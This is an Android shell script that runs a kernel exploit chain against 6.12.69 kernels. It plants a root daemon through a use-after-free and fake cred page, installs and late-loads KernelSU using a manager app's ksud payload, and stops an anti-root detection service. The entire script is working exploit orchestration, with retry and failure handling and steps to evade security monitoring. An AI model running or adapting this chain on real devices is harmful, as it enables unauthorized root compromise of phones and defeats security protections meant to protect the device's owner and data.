#!/system/bin/sh
# 6.12.69-ex: fast-tuned YuKongA timer -> rootd -> manager ksud install/late-load.
# Mirrors the 98260 branch: plant/rootd, then external ksud and manager.
D=${PYB110_DIR:-/data/local/tmp/pyb110}
cd "$D" || exit 1

MANAGER=${PYB110_MANAGER:-kernelsu}
DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
case "$MANAGER" in
  finasu) MPKG=me.yuki.fina; BKS=ksud_finasu ;;
  next) MPKG=com.rifsxd.ksunext; BKS=ksud_next ;;
  bakasu) MPKG=com.resukisu.resukisu; BKS=ksud_bakasu ;;
  sukisu) MPKG=com.sukisu.ultra; BKS=ksud_sukisu ;;
  *) MANAGER=kernelsu; MPKG=me.weishu.kernelsu; BKS=ksud_official ;;
esac
KMI=android16-6.12
SOCK=/data/local/tmp/t61269-root.sock
echo "MANAGER=$MANAGER PKG=$MPKG KMI=$KMI"

KERNEL=$(uname -r 2>/dev/null)
case "$KERNEL" in
  *6.12.69*) ;;
  *) echo "KERNEL_MISMATCH: $KERNEL (6.12.69-ex needs a 6.12.69 kernel)"; exit 10 ;;
esac
echo "KERNEL=$KERNEL"

chmod 755 t61269 t61269_su "$BKS" 2>/dev/null
BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | tr -d '-' | tr -d '\r')
UPTIME=$(cut -d. -f1 /proc/uptime 2>/dev/null)
echo "BOOT_ID=$BOOT_ID UPTIME=${UPTIME}s"
STALE_PID=""
for p in $(pidof t61269 2>/dev/null); do
  [ -r "/proc/$p/comm" ] || continue
  comm=$(cat "/proc/$p/comm" 2>/dev/null)
  [ "$comm" = "t61269" ] || continue
  st=$(awk '{print $22}' "/proc/$p/stat" 2>/dev/null)
  clk=$(getconf CLK_TCK 2>/dev/null)
  [ -z "$clk" ] && clk=100
  started=$(( ${st:-0} / clk ))
  cmd=$(tr '\000' ' ' < "/proc/$p/cmdline" 2>/dev/null)
  echo "STALE_CHECK pid=$p comm=$comm started=${started}s uptime=${UPTIME}s cmd=$cmd"
  [ "$started" -le "${UPTIME:-0}" ] && STALE_PID=$p
done
if [ -n "$STALE_PID" ]; then
  echo "STALE_PLANT: t61269 pid=$STALE_PID from this boot is still holding the page; a cold power-off/on is required (zygote soft reboot does not clear it)"
  exit 12
fi
if grep -qi '^kernelsu ' /proc/modules 2>/dev/null; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit"
  su -c "id" 2>&1 | head -2
  exit 0
fi

APK=$(pm path "$MPKG" 2>/dev/null | sed -n 's/^package://p' | head -n 1)
KSUD=""
if [ -n "$APK" ]; then
  KSUD="$(dirname "$APK")/lib/arm64/libksud.so"
fi
# Some managers randomize the embedded ksud payload name (SukiSU). Try the
# large native payloads in the manager's lib dir and keep the one that
# identifies itself as ksud.
if [ -n "$APK" ]; then
  LIBDIR="$(dirname "$APK")/lib/arm64"
  for f in "$LIBDIR"/lib*.so; do
    [ -f "$f" ] || continue
    sz=$(wc -c < "$f" 2>/dev/null)
    [ "${sz:-0}" -gt 2000000 ] || continue
    cp -f "$f" "$D/ksud_cand" 2>/dev/null || continue
    chmod 755 "$D/ksud_cand" 2>/dev/null
    ver=$(timeout 3 "$D/ksud_cand" --version 2>/dev/null | head -n 1)
    case "$ver" in
      *uapi*)
        KSUD="$D/ksud_cand"
        echo "KSUD_MANAGER_PAYLOAD=$f $ver"
        break
        ;;
    esac
  done
fi
[ -x "$KSUD" ] || KSUD=$(find /data/app -path "*${MPKG}*/lib/arm64/libksud.so" 2>/dev/null | head -n 1)
[ -x "$KSUD" ] || KSUD=$(find /data/app -path "*${MPKG}*" -name libksud.so 2>/dev/null | head -n 1)
if [ -z "$KSUD" ] && [ -n "$APK" ] && command -v unzip >/dev/null 2>&1; then
  unzip -p "$APK" lib/arm64-v8a/libksud.so > "$D/ksud_from_apk" 2>/dev/null &&
    chmod 755 "$D/ksud_from_apk" && KSUD="$D/ksud_from_apk"
fi
[ -x "$KSUD" ] || KSUD="$D/$BKS"
[ -x "$KSUD" ] || KSUD=/data/adb/ksu/bin/ksud
[ -x "$KSUD" ] || KSUD=""
echo "KSUD=${KSUD:-none} bundled=$BKS"
[ -n "$KSUD" ] && echo "KSUD_VERSION=$("$KSUD" --version 2>&1 | head -n 1)"

wait_kernelsu_shell() {
  n=0
  while [ $n -lt 30 ]; do
    if grep -qi '^kernelsu ' /proc/modules 2>/dev/null; then
      return 0
    fi
    if timeout 3 su -c id 2>/dev/null | grep -q "uid=0"; then
      echo "KSU_HIDDEN: module not visible in /proc/modules but su works"
      return 0
    fi
    sleep 1
    n=$((n+1))
    [ $((n % 5)) -eq 0 ] && echo "WAIT_KSU=$n"
  done
  return 1
}

echo "[1/4] plant (UAF -> fake cred -> rootd)"
rm -f t61269.log "$SOCK"
: > t61269.log
tail -n +1 -f t61269.log 2>/dev/null &
TAILPID=$!
setsid sh -c "./t61269 fake > t61269.log 2>&1" &
i=0
ROOTED=0
while [ $i -lt 60 ]; do
  sleep 1
  i=$((i+1))
  if grep -q "ROOTD_READY" t61269.log 2>/dev/null; then ROOTED=1; break; fi
  if grep -q "parking without reap" t61269.log 2>/dev/null; then
    echo "PLANT_FAIL_MISS: spray missed, t61269 parked (page held); cold reboot required"
    break
  fi
  if ! pidof t61269 >/dev/null 2>&1; then
    echo "TOOL_EXITED"
    break
  fi
  [ $((i % 5)) -eq 0 ] && echo "WAIT_ROOTD=$i"
done
kill $TAILPID 2>/dev/null
wait $TAILPID 2>/dev/null
if [ "$ROOTED" != "1" ]; then
  echo "PLANT_FAIL: no rootd (enforce=$(getenforce 2>/dev/null)); do NOT kill t61269, cold reboot required"
  exit 13
fi
echo "PLANT_OK: rootd ready"

RISK_STATE=$(getprop init.svc.riskdetect 2>/dev/null | tr -d '\r')
if [ "$DISABLE_ANTIROOT" = "1" ] && [ "$RISK_STATE" = "running" ]; then
  ./t61269_su -c "stop riskdetect" 2>&1
  echo "ANTIROOT_STOP_RC=$?"
else
  echo "ANTIROOT_SKIP state=${RISK_STATE:-absent}"
fi

if [ -z "$KSUD" ]; then
  echo "KSUD_MISSING: install the matching manager APK (pkg=$MPKG); looked at APK libs, $D/$BKS and /data/adb/ksu/bin/ksud"
  exit 14
fi
# Install first, then load.  The rootd connection must be established while
# SELinux is still permissive: once late-load brings KSU up, the kernel
# re-enables Enforcing and a new rootd connect is denied.
echo "[2/4] install + late-load via $MANAGER"
CMD="$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --kmi $KMI --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25"
./t61269_su -c "$CMD" 2>&1
if ! wait_kernelsu_shell; then
  echo "LATE_LOAD_RETRY: without --kmi"
  CMD="$KSUD install; echo KSUD_INSTALL_RC=\$?; $KSUD late-load --allow-shell --package-name $MPKG; echo LATE_LOAD_RC=\$?; $KSUD debug info 2>&1 | head -n 20; logcat -d -s ksud 2>/dev/null | tail -n 25"
  ./t61269_su -c "$CMD" 2>&1
fi
if ! wait_kernelsu_shell; then
  echo "LOAD_FAIL: module not live; rootd kept (do not kill t61269, full reboot)"
  exit 15
fi
echo "MODULE_LOADED"

echo "[3/4] wait for su"
n=0
SUOK=0
while [ $n -lt 300 ]; do
  if su -c id 2>/dev/null | grep -q "uid=0"; then
    SUOK=1
    break
  fi
  sleep 0.1
  n=$((n+1))
done
echo "SU_WAIT=$n su_ok=$SUOK"
if [ "$SUOK" = "1" ]; then
  su -c id 2>&1 | head -2
else
  echo "SU_NOT_READY: module is live but su is not usable; rootd kept"
fi

if [ "$SUOK" = "1" ]; then
  if [ "$MANAGER" = "finasu" ] && [ -n "$APK" ]; then
    su -c "$KSUD dynamic set-apk '$APK'" 2>&1
    echo "DYNAMIC_SET_APK_RC=$?"
  fi
  DIS=$(su -c "pm list packages -d --user 0" 2>/dev/null | tr -d '\r')
  for p in com.oplus.exsystemservice com.oplus.screenshot; do
    if su -c "pm list packages '$p'" 2>/dev/null | grep -qx "package:$p"; then
      if printf '%s\n' "$DIS" | grep -qx "package:$p"; then
        su -c "pm enable --user 0 '$p'" >/dev/null 2>&1
        echo "SCREENSHOT_STACK_ENABLED=$p"
      fi
    fi
  done
  # The fake cred page is no longer needed once su works; clean the rootd so a
  # zygote-only restart does not leave a stale t61269 that blocks the next run.
  su -c "pkill -9 t61269 2>/dev/null; rm -f $SOCK" 2>/dev/null
  if pidof t61269 >/dev/null 2>&1; then
    echo "ROOTD_KEPT: cleanup failed; full reboot before rerun"
  else
    echo "ROOTD_CLEANED"
  fi
else
  echo "ROOTD_KEPT: no su; full reboot before rerun"
fi

echo "[4/4] manager"
echo "MANAGER_START=late-load"
echo DONE
